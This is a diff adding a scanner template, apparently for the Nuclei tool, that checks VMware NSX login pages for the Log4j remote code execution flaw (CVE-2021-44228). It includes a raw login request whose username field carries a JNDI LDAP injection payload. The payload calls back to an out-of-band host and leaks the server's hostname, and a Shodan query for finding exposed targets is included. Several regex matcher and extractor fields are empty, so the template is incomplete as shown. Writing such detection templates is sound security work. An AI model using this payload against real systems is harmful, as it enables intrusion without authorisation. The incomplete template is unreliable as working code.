@@ -1,0 +1,69 @@
+id: vmware-nsx-log4j
+
+info:
+  name: VMware NSX - Remote Code Execution (Apache Log4j)
+  author: DhiyaneshDK
+  severity: critical
+  description: VMware NSX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://kb.vmware.com/s/article/87086
+    - https://logging.apache.org/log4j/2.x/security.html
+    - https://nvd.nist.gov/vuln/detail/CVE-2021-44228
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
+    cvss-score: 10
+    cve-id: CVE-2021-44228
+    cwe-id: CWE-77
+  metadata:
+    verified: true
+    max-request: 1
+    shodan-query: html:"vmw_nsx_logo-black-triangle-500w.png"
+  tags: cve,cve2021,rce,jndi,log4j,graylog,kev,oast
+variables:
+  rand1: '{{rand_int(111, 999)}}'
+  rand2: '{{rand_int(111, 999)}}'
+
+http:
+  - raw:
+      - |
+        @timeout: 20s
+        POST /login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Origin: {{BaseURL}}
+        Referer: {{BaseURL}}/login.jsp
+
+        username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&submit=
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the DNS Interaction
+        words:
+          - "dns"
+
+      - type: word
+        part: location
+        words:
+          - '/login.jsp?login_error=1'
+
+      - type: regex
+        part: interactsh_request
+        regex:
+
+
+    extractors:
+      - type: kval
+        kval:
+
+
+      - type: regex
+        group: 2
+        regex:
+        part: interactsh_request
+
+      - type: regex
+        group: 1
+        regex:
+        part: interactsh_request
+# digest: 4b0a004830460221008d7d00dc839c7689c21aeb46ee294a97ca65414a521ad162bfcc6c0dd2901d4c022100f96346b109721448fc5ee67a3469c0a2a913bcd494fdd6a7d097750e5ba64278:922c64590222798bb761d5b6d8e72950
